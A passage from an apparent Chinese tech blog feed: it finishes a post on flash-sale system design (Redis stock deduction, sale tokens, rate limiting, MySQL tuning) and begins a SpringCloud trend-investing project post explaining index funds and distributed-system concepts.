class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`item_id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">`amount`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">`status`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'//1表示初始状态，2表示下单扣减库存成功，3表示下单回滚'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`stock_log_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br></pre></td></tr></table></figure><blockquote><p>库存数据库最终一致性</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200904162454219.png" alt="image-20200904162454219" style="zoom:50%"><p><strong>设计原则</strong>:</p><ul><li>宁可少卖，不能超卖</li></ul><p><strong>方案:</strong></p><ul><li>redis可以比实际数据库中少</li><li>超时释放</li></ul><blockquote><p>库存售罄</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200904163627831.png" alt="image-20200904163627831" style="zoom:50%"><blockquote><p>增加判断库存售空的情况：不进入下单流水号</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">decreaseStock</span><span class="params">(Integer itemId, Integer amount)</span> <span class="keyword">throws</span> BusinessException </span>&#123;</span><br><span class="line">    <span class="comment">//int affectedRow = itemStockDOMapper.decreaseStock(itemId, amount);</span></span><br><span class="line">    Long result = redisTemplate.opsForValue().increment(<span class="string">"promo_item_stock_"</span> + itemId, amount.intValue() * -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(result &gt;= <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//打上库存已经售罄的标识</span></span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">"promo_item_stock_invalid_"</span> + itemId, <span class="string">"true"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//更新库存失败，回滚</span></span><br><span class="line">        increaseStock(itemId, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//在orderController添加</span></span><br><span class="line"><span class="comment">//判断是否库存已售罄，若对应的售罄key存在，则直接返回下单失败</span></span><br><span class="line"><span class="keyword">if</span>(redisTemplate.hasKey(<span class="string">"promo_item_stock_invalid_"</span> + itemId))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.STOCK_NOT_ENOUGH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200904170053689.png" alt="image-20200904170053689"></p><hr><h4 id="流量削峰"><a href="#流量削峰" class="headerlink" title="流量削峰"></a>流量削峰</h4><p>上面设计存在的问题：</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200904171428254.png" alt="image-20200904171428254" style="zoom:50%"><blockquote><p>使用秒杀令牌</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成秒杀令牌</span></span><br><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/generatetoken"</span>, consumes = CONTENT_TYPE_FORMED)</span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonReturnType <span class="title">generatetoken</span><span class="params">(@RequestParam(<span class="string">"itemId"</span>)</span>Integer itemId</span></span><br><span class="line"><span class="function">        ,@<span class="title">RequestParam</span><span class="params">(name = <span class="string">"promoId"</span>)</span>Integer promoId) <span class="keyword">throws</span> BusinessException </span>&#123;</span><br><span class="line">    <span class="comment">//获取用户的登录信息</span></span><br><span class="line">    String token = httpServletRequest.getParameterMap().get(<span class="string">"token"</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isEmpty(token))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.USER_NOT_LOGIN, <span class="string">"用户未登录，不能下单"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取用户的登录信息</span></span><br><span class="line">    UserModel userModel = (UserModel) redisTemplate.opsForValue().get(token);</span><br><span class="line">    <span class="keyword">if</span>(userModel == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">//超时，数据丢失</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.USER_NOT_LOGIN, <span class="string">"用户未登录，不能下单"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取秒杀访问令牌</span></span><br><span class="line">    String promoToken = promoService.generateSecondKillToken(promoId, itemId, userModel.getId());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(promoToken == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.PARAMETER_VALIDATION_ERROR, <span class="string">"生成令牌失败"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CommonReturnType.create(promoToken);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端首先发送<code>/generatetoken</code>请求来获取令牌，，此时该令牌会发送到<code>redis</code>服务器，然后才可以进行下单的请求，下单请求将验证当前的令牌是否与redis中的令牌一致，由于</p><blockquote><p>缺陷：秒杀令牌只要活动一开始就无限制生成，影响系统性能</p></blockquote><hr><h5 id="秒杀大闸原理"><a href="#秒杀大闸原理" class="headerlink" title="秒杀大闸原理"></a>秒杀大闸原理</h5><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200905101814367.png" alt="image-20200905101814367" style="zoom:67%"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将大闸的限制数设置到到redis中</span></span><br><span class="line">redisTemplate.opsForValue().set(<span class="string">"promo_door_count_"</span>+ promoId,</span><br><span class="line">        itemModel.getStock().intValue()*<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>这样流量进来时，进行一个限流，只有itemModel.getStock().intValue()*5的用户才有秒杀资格。</p><p><strong>缺陷：</strong></p><ul><li><strong>浪涌流量涌入后系统无法应对</strong></li><li><strong>多库存，多商品等令牌限制能力弱</strong></li></ul><blockquote><p>队列泄洪原理</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200905104343819.png" alt="image-20200905104343819" style="zoom:67%"><blockquote><p><strong>使用线程池：每次只允许20个线程去创建订单，其余用户进入等待队列</strong></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//新建20个线程的线程池</span></span><br><span class="line">        executorService = Executors.newFixedThreadPool(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同步调用线程池的submit方法</span></span><br><span class="line"><span class="comment">//拥塞窗口为20的等待队列，用来队列化泄洪</span></span><br><span class="line">Future&lt;Object&gt; future = executorService.submit(<span class="keyword">new</span> Callable&lt;Object&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//加入库存流水init状态</span></span><br><span class="line">        String stockLogId = itemService.initStockLog(itemId, amount);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//再去完成对应的下单事务型消息</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建订单</span></span><br><span class="line">        <span class="comment">//OrderModel order = orderService.createOrder(userModel.getId(), itemId, promoId, amount);</span></span><br><span class="line">        <span class="keyword">boolean</span> b = mqProducer.transactionAsyncReduceStock(userModel.getId(), promoId, itemId, amount, stockLogId);</span><br><span class="line">        <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.UNKONWN_ERROR, <span class="string">"下单失败"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    future.get();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.UNKONWN_ERROR);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.UNKONWN_ERROR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200905112151722.png" alt="image-20200905112151722"></p><blockquote><p><strong>建议将队列维护在本地内存。因为redis有网络的消耗</strong></p></blockquote><h4 id="防刷限流技术"><a href="#防刷限流技术" class="headerlink" title="防刷限流技术"></a>防刷限流技术</h4><blockquote><p>使用验证码防刷，此处省略。</p></blockquote><hr><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200909112655053.png" alt="image-20200909112655053" style="zoom:50%"> <img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200909112850039.png" alt="image-20200909112850039" style="zoom:50%"><blockquote><p>在互联网项目中，一般使用令牌桶算法。</p></blockquote><hr><blockquote><p>限流算法实现：基于谷歌的Guava</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//令牌桶</span></span><br><span class="line"><span class="keyword">private</span> RateLimiter orderCreateRateLimiter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostConstruct</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//允许300个令牌</span></span><br><span class="line">    orderCreateRateLimiter = RateLimiter.create(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用时判断</span></span><br><span class="line"><span class="keyword">if</span>(!orderCreateRateLimiter.tryAcquire())&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(EmBusinessError.RATELIMIT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><blockquote><p>防刷技术</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200909163050744.png" alt="image-20200909163050744" style="zoom:67%"><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200909163649212.png" alt="image-20200909163649212"></p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="关于登录相关问题："><a href="#关于登录相关问题：" class="headerlink" title="关于登录相关问题："></a>关于登录相关问题：</h4><ol><li><p><code>session</code>一般定义呆滞时间为30分钟时间。</p></li><li><p>安全性问题：<code>Https</code>和自定义协议(APP中一般使用二进制加密，如使用<code>protobuf</code>协议)</p></li><li><p>弱登录态：即推荐算法，不登陆也会智能推荐，需要在session会话结束前续命（<strong>模拟心跳：在js上设置一个定时器，每隔几秒向服务端发送一个keepalive请求</strong>）。</p></li><li><p><code>SSO</code>单点登录：<strong>同一个域名只能有一个cookie且唯一，导致会出现访问不同页面需要重复登录的问题，因此需要单点登录。</strong>分为以下三种情况：</p><ol><li>同域名：cookie相同，SSO只需要保证使用同一个存储的ID即可。</li><li>跟域名相同而子域名不同：设置http的domain=/，这样设置，服务器只会关注<strong>根域名</strong>，从而生成相同的cookie</li><li><strong>域名都不相同</strong>：</li></ol><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200909201407037.png" alt="image-20200909201407037"></p></li></ol><hr><h4 id="mysql性能提升"><a href="#mysql性能提升" class="headerlink" title="mysql性能提升"></a><strong><code>mysql</code>性能提升</strong></h4><p><strong>以下均以<code>innodb</code>引擎为例</strong>。</p><p>秘诀：遇到性能优化问题，使用：</p><ul><li><strong>缓存</strong></li><li><strong>异步</strong></li><li><strong>批处理</strong>：批量insert，批量update，避免for循环</li></ul><blockquote><p>批处理示例：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//for循环</span></span><br><span class="line"><span class="keyword">for</span> each &#123;<span class="function">insert into table <span class="title">values</span> <span class="params">(<span class="number">1</span>)</span>&#125;</span></span><br><span class="line"><span class="function"><span class="comment">//批量插入，尤其是正对json数组格式的数据</span></span></span><br><span class="line"><span class="function">Execute once insert into table <span class="title">values</span> <span class="params">(<span class="number">1</span>)</span>,<span class="params">(<span class="number">2</span>)</span>,<span class="params">(<span class="number">3</span>)</span>，<span class="params">(<span class="number">4</span>)</span>...</span>;</span><br></pre></td></tr></table></figure><p>批量写的优势：</p><ul><li>Sql编译N次和1次的时间与空间复杂度</li><li>网络消耗的时间复杂度</li><li>磁盘寻址的复杂度</li></ul><blockquote><p>使用索引</p></blockquote><hr><blockquote><p>mysql单机性能优化</p></blockquote><p>参数优化：</p><ul><li>max_connection=1000</li><li>innodb_file_per_table=1。即每个table作为一张表文件，而不是一个全部表在一个文件中。</li><li>innodb_buffer_pool_size=1G。数据读写时，先读写buffer。该参数一般设为内存60-70%。</li><li>innodb_log_file_size=256M</li><li>innodb_log_buffer_size=16M</li><li>innodb_flush_log_at_trx_commit= 2。<strong>即undo/redo日志先写入文件系统，但不执行flush操作，由于写入文件系统时（缓存区域）已经是linux操作系统内核态的操作级别，只要系统不断电就一定能写入成功，然后再依次进行flush操作</strong>。需要放在[mysqld_safe]节点</li><li>innodb_data_file_path=ibdata1:1G;ibdata2:1G;ibdata3:1G:auto extend。设置文件大小到1g时新建文件</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200909210603922.png" alt="image-20200909210603922"></p><blockquote><p>mysql分布式扩展</p></blockquote><ul><li>开启<code>bin log</code></li><li>色湖之主从同步账号，配置主从同步。</li></ul>]]></content>
      <tags>
        <tag>Java</tag>
        <tag>秒杀</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud之趋势投资实践</title>
    <url>/2020/07/28/SpringCloud%E4%B9%8B%E8%B6%8B%E5%8A%BF%E6%8A%95%E8%B5%84%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><ol><li><p>量化投资是金融界的发展方向。 <strong>福利待遇好</strong>的行业，大家都知道是有： IT 和 金融。 而量化投资，恰恰就是这两者的交汇点。 各个金融机构，投资公司都会越来越深入地进行量化投资的领域，不可避免地就会越来越需要这方面的计算机技术人才。 而有过量化投资经历，必定在激烈的竞争中增加自己的优势。</p></li><li><p><strong>分布式和集群</strong>开发经验。 本项目会先使用单站方式演示，然后分析其缺点，接着对这个单站基于 springcloud 进行 分布式和集群的改造。 通过参与这个过程，大家第一手资料地感受到分布式与集群的好处，积累珍贵的分布式和集群开发经验。</p></li><li><p>量化投资概念对个人理财观念的建立。 话说，你不理财，财不理你。理财是必然要做的事情，不然钱放在银行里，连通货膨胀都跑不过呢。 那么如何理财？ 如何有效，低风险，高收益地理财？ 通过参与这次量化投资项目，以程序员身份拉去第一手的原生资料，对原生资料，用透明的算法计算出明确的结果。 这样的方式得到的年化收益率才是让自己信服的。 可以说，<strong>量化投资观念的建立，这是一件对一生都有益的事情，而且越早开始越好呀</strong>。</p></li></ol><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200827203448860.png" alt="image-20200827203448860" style="zoom:50%"><a id="more"></a><h2 id="投资概念"><a href="#投资概念" class="headerlink" title="投资概念"></a>投资概念</h2><h4 id="复利"><a href="#复利" class="headerlink" title="复利"></a>复利</h4><p>复利公式：<code>F = p* ( (1+r)^n )</code><br><strong>F</strong> 最终收入<br><strong>p</strong> 本金<br><strong>r</strong> 年利率<br><strong>n</strong> 存了多少年</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><blockquote><p>优点很明显，一只股票，每天最多可以上涨 10%。 只需要 7.2 个涨停板，就翻倍啦。</p><p>比如说现在有 10 万，最好的情况下，只要7.2天就变成 20 万啦。</p></blockquote><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><blockquote><p>缺点也一样，一只股票，每天最多可以跌掉 10%。 如果连续跌7天， 就只有原来的 47%啦。</p><p>还有更致命的是。。。 股市会爆雷和退市。 一退市，手上的股票，全成废纸了，一文不值。比如抗美，新城，乐视这几个</p></blockquote><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><blockquote><p>既想享受股票收益带来的好处，又承受不了爆雷，退市这种巨大的风险，那么改怎么办呢？子曰： 不要把鸡蛋都放在一个篮子里。所以解决办法也简单，买很多只股票嘛。 比如说，买了100只股票，假如有一只退市了，对总体而言，亏损也才 1% 嘛，这并不是不能承受的呀。但是大家要学习，工作，生活。 哪里来那么多精力做100只股票的交易，何况还要不停地盯盘看呢？ 这个时候，我们就要引入<code>指数</code>的概念啦。</p></blockquote><h4 id="指数"><a href="#指数" class="headerlink" title="指数"></a>指数</h4><blockquote><p>指数是什么意思呢？ 如果我买一只股票，就叫做股票投资。 如果我买很多股票，比如100只吧，而这100只股票，都是医疗方面的公司对应的股票，那么这100只股票，我们另外给它取个名字，就叫做 医疗指数。目前沪深股市里，总共有3000多家公司，如果我们把市值最大的300家公司编成一只指数，那么就叫做 <strong>沪深300指数</strong>。紧接着的 500 家公司，就叫做<strong>中证500指数</strong></p></blockquote><h4 id="指数优点"><a href="#指数优点" class="headerlink" title="指数优点"></a>指数优点</h4><blockquote><p>因为一只指数里包含很多股票，所以风险就分担了，所以就不会出现像单只股票这样，退市后一下清零的问题，从安全性上来讲，就好多了。那么风险分担了，是不是收益就差很多了呢？ 也不尽然， 比如以沪深300为例，其历史数据在这里可查：<br><span class="exturl" data-url="aHR0cDovL3F1b3RlLmVhc3Rtb25leS5jb20venMwMDAzMDAuaHRtbA==">http://quote.eastmoney.com/zs000300.html<i class="fa fa-external-link-alt"></i></span></p><p>如图所示，在2007年这波牛市， 从最低点 807，到最高点 5891， 总共涨了有 7.29 倍。<br>2015年这波牛市，也是涨了有 2.3倍。</p><p>当然，并不是说大家都能做到在最低的地方建仓，并且在最高的地方逃顶，而是表示指数依然是有巨大的投资潜力滴，并且它是没有退市清零的风险。除非发生极低概率的事情，比如第三次世界大战</p></blockquote><h4 id="指数缺点"><a href="#指数缺点" class="headerlink" title="指数缺点"></a>指数缺点</h4><blockquote><p>与普通股票一样，指数也会发生大起大落。它也是非常具备波动性的。 那么如何多赚上涨钱， 而少吃下跌的亏呢？ 这就是本项目： 量化趋势投资要解决的问题啦。</p></blockquote><p>那么指数又如何交易呢？ 实际指数身是没有办法进行交易的，我们只能交易指数基金。 这就是接下来的知识点要讲的啦： <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3RyZW5kL3RyZW5kLTIwNzYvMjA3Ni5odG1s">指数基金<i class="fa fa-external-link-alt"></i></span></p><h4 id="基金"><a href="#基金" class="headerlink" title="基金"></a>基金</h4><p>基金说白了，就是一下子买卖一揽子股票。 这样交易起来就轻松愉快多了，而不用那么繁琐切容易出错了。</p><h4 id="主动基金"><a href="#主动基金" class="headerlink" title="主动基金"></a>主动基金</h4><blockquote><p>基金可以简单地分为主动基金和被动基金。基金主要是由基金经理进行打理，主动基金就是由基金经理决定，对那些股票进行交易，什么时候交易，交易多少。所以基金经理本人的见识，理念，执行力以及与当时的行情契合程度，就决定了基金的收益如何。</p><p>好的主动基金的收益是非常可观的。 同样的，差的主动基金，也是差的很让人吐血的。<br><span class="exturl" data-url="aHR0cDovL2Z1bmQuZWFzdG1vbmV5LmNvbS9kYXRhL2Z1bmRyYW5raW5nLmh0bWwjdGFsbDtjMDtyO3N6emY7cG41MDtkZGVzYztxc2QyMDE4MDcxNjtxZWQyMDE5MDcxNjtxZGlpO3pxO2dnO2d6YmQ7Z3pmcztiYnp0O3NmYmI=">http://fund.eastmoney.com/data/fundranking.html#tall;c0;r;szzf;pn50;ddesc;qsd20180716;qed20190716;qdii;zq;gg;gzbd;gzfs;bbzt;sfbb<i class="fa fa-external-link-alt"></i></span></p><p>这里就是东方财务的天天基金网提供的各个基金排行榜。 可以看到主动基金的收益高的是很高滴，低的也是很低滴。那么谁能保证自己一定能买到收益最高的那个呢？ 这个和在茫茫股海里选股，选到好的主动基金的概率似乎也不太乐观呢。</p></blockquote><h4 id="被动基金"><a href="#被动基金" class="headerlink" title="被动基金"></a>被动基金</h4><blockquote><p>所谓的被动基金，就是跟踪指数的基金。 指数是由多个股票组成，比如 沪深300指数，就是由市值最大的300只股票，按照一定的比例进行组合而成。</p><p>而跟踪指数300的基金，可以说，就是尽量无脑和 沪深300指数里的股票指数尽可能的保持一致。这样，就和基金经理本人的能力，见识，执行力什么的不可控的元素脱钩了。</p><p>比如说沪深300，在天天基金上搜索，就可以看到各个不同的基金公司对 300的跟踪基金。 他们的表现会有一定的出入，但是差别都不太大。</p></blockquote><h4 id="被动基金收益"><a href="#被动基金收益" class="headerlink" title="被动基金收益"></a>被动基金收益</h4><blockquote><p>那么被动基金的收益到底如何呢？<br>我们还是以沪深300为例，我们选博时沪深300指数基金为例来进行分析：</p><p><span class="exturl" data-url="aHR0cDovL2Z1bmQuZWFzdG1vbmV5LmNvbS8wNTAwMDIuaHRtbD9zcG09c2VhcmNo">http://fund.eastmoney.com/050002.html?spm=search<i class="fa fa-external-link-alt"></i></span></p><p>如图所示，它成立于2003年，到现在累计净值达到了 3.4822. 期间总共经历了 16年的时间。</p><p>累计净值 3.4822 是什么概念呢？ 就是说， 假如从 2003年，就投入了一笔钱，比如说 10000块吧，到今天就是 34822 元了。<br>经历了16年，那么年化是多少呢：<br><code>3.4822 ^ (1/16) = 1.08</code><br>它的年化达到了惊人的 8%。<br>没想到吧，买一指数基金，就算什么都不做，平均算下来，每年都有 8%的收益。 这可比存银行每年的利息高多了。 且不说低的可怜的活期了，就算是大额存单，才 4.2% 左右。</p></blockquote><p>其实指数基金的年化收益已经挺不错了，那么如何再提高呢？ 这就是下个知识点我们要讲的量化投资啦： <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3RyZW5kL3RyZW5kLTIwNzcvMjA3Ny5odG1s">量化投资<i class="fa fa-external-link-alt"></i></span></p><h4 id="传统投资VS量化投资"><a href="#传统投资VS量化投资" class="headerlink" title="传统投资VS量化投资"></a>传统投资VS量化投资</h4><blockquote><p><strong>传统投资</strong>：就像是中医，靠的是经验，见识，个人判断。 有时候能够取得非常耀眼的成绩，但是与此同时，也会因为一步错迈向无底深渊呀。</p><p><strong>量化投资</strong>：就像是西医，靠的是系统，数据，统计概率。 掌握了一定的量化手段，不需要具备20年的从业经验，也会在证卷市场取得相当的成绩。 虽然不能像传统投资里的某些神人那样，取得非常辉煌的战绩，但是超越普通人的投资汇报，还是可以期待的。</p></blockquote><h4 id="量化技术"><a href="#量化技术" class="headerlink" title="量化技术"></a>量化技术</h4><blockquote><p>量化技术有很多种，如<strong>高频交易，价值投资，定投， 网格，趋势投资，alpha 投资</strong> 等等等等。<br>不同的技术，都会要求不同的策略，对与不同市场的收益也各不相同。而量化投资技术本身已经发展地相对成熟了，就如同大家用 java 来开发网站一样，会有各种设计模式， mvc 结构， 前后端分离等等现成的套路。 量化投资也是一样，有很多前人的研究成果，大家可以直接拿来用就是了，不一定需要自己全部从0来研究。</p></blockquote><h2 id="趋势投资"><a href="#趋势投资" class="headerlink" title="趋势投资"></a>趋势投资</h2><h4 id="What？"><a href="#What？" class="headerlink" title="What？"></a>What？</h4><blockquote><p>所谓的趋势投资，就是认为凡事都有一定的惯性。 比如基金上涨到一定程度形成了趋势，有一定的概率后面还是会上涨。同样的，下跌的趋势一旦形成了，也有一定的概率后面还是继续下跌。</p><p>所以趋势投资其实就是等待两种信号，当上涨趋势形成，就会得到一个买入信号，此时就进行买入。 当跌倒一定程度了，就会得到一个卖出信号，就进行卖出操作。</p><p>说白了，就是追涨杀跌。哈哈，可是一听到追涨杀跌这4个字，是不是就有一种被割韭菜的感觉呢？ 那么为什么趋势投资的追涨杀跌可以盈利呢？ 下个步骤，就来讲为什么可以盈利。</p></blockquote><h4 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h4><p>既然是趋势投资是追涨杀跌，为何能盈利呢？<br>知乎上有一篇文章讲的非常好： <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzU2NzIyMzM0L2Fuc3dlci81MjIyMDQ4MzY=">https://www.zhihu.com/question/56722334/answer/522204836<i class="fa fa-external-link-alt"></i></span></p><p>简单概括一下：</p><ol><li><p>交易的交易盈亏概率就是这个正态分布图。 大部分交易都是 -0.025% 到 0.025% 之间，就是输赢都不大，但是了占绝了大部分的比例。</p></li><li><p>赢很多的，就是右边的，但是他们很少。</p></li><li><p>输很多的，就是左边的，同样的，他们也很少。</p></li><li><p>趋势投资为什么能盈利？ 因为按照趋势投资的算法，<strong>它会保留绝大部分右边的，但是却会砍掉绝大部分左边的。</strong> 总体上来讲，盈利的大部分都吃掉了，而亏损的大部分都躲避了。 所以，最后就会有不错的盈利表现了。</p></li></ol><h4 id="SO"><a href="#SO" class="headerlink" title="SO"></a>SO</h4><p>那么做趋势投资是不是只赚亏呢？ 哈哈哈，这世界，哪里来只赚不亏的生意呀， 肯定也是会亏的嘛。 只是亏得幅度更小。趋势投资的特点是： 当大盘上涨的时候， 涨得会少一些。 当大盘跌的时候，跌得也更少一些。</p><h2 id="分布式和集群"><a href="#分布式和集群" class="headerlink" title="分布式和集群"></a>分布式和集群</h2><p><strong>单体架构</strong><br>家里生小宝宝啦，由于自己没有照顾小宝宝的经验，所以请了位经验丰富的月嫂。 这位月嫂从买菜，到做饭，洗衣，拖地，喂奶，哄睡，洗澡，换纸尿裤，擦屁股，做排气操，夜间陪护，给奶妈做月子餐等等，全部都做。 这种叫做单体架构。</p><p><strong>集群：</strong><br>什么都做，一个月嫂怎么够呢，肯定忙不过来呀，那就请两个月嫂吧，这叫做集群。</p><p><strong>高可用概念：</strong><br>有一个月嫂过生日，想请假回去和亲戚打一天麻将。如果只有一个月嫂，她走了，就叫做服务中断了。 但是因为做了集群，有两个月嫂，走了一个，另一个还是能用，虽然相比较吃力一些，但是毕竟还是能用的，这个现象叫做高可用。</p><p><strong>分布式：</strong><br>一个月嫂，一个月的费用基本上都要1万多，还有房贷，还有车贷，生活费用还高，实在是请不起两位啊，那就还是请一位吧。 可是事情那么多，她实在忙不过来，怎么办呢？ 那就把爷爷请过来买菜，把奶奶请过来做饭。 这样服务本来仅仅是由月嫂一人提供的，变成了和宝宝相关的由月嫂负责，采购由爷爷负责，餐饮由奶奶负责。 这就叫做分布式了。</p><p><strong>低耦合概念：</strong><br>做宝宝服务的月嫂去打麻将了，不影响做饭的奶奶。 做采购的爷爷去喝酒了，也不影响月嫂的宝宝服务，这叫做低耦合。</p><p><strong>高内聚概念：</strong><br>和宝宝相关的事情都是月嫂在做，月嫂兑奶方式快慢，只会影响自己，对爷爷和奶奶的服务没影响. 这叫做高内聚。</p><p><strong>集群+分布式：</strong><br>奶奶一个人做饭，做久了也烦啊，也累啊，也想打麻将呀。 那么就把姥姥也请过来吧。 这样做饭这个服务，就由奶奶和姥姥这个集群来承担啦。她们俩，谁想去汗蒸了，都有另一位继续提供做饭服务。 这就叫做集群<code>+</code>分布式。</p><h2 id="服务注册中心"><a href="#服务注册中心" class="headerlink" title="服务注册中心"></a>服务注册中心</h2><p>我这里使用<code>Alibaba</code>的<code>nacos</code>作为注册中心</p><ul><li>默认控制台地址： <span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo4ODQ4L25hY29zL2luZGV4Lmh0bWw=">http://localhost:8848/nacos/index.html<i class="fa fa-external-link-alt"></i></span></li></ul><h2 id="第三方数据"><a href="#第三方数据" class="headerlink" title="第三方数据"></a>第三方数据</h2><p>使用各类指数数据，以<code>json</code>格式存储</p><p><img 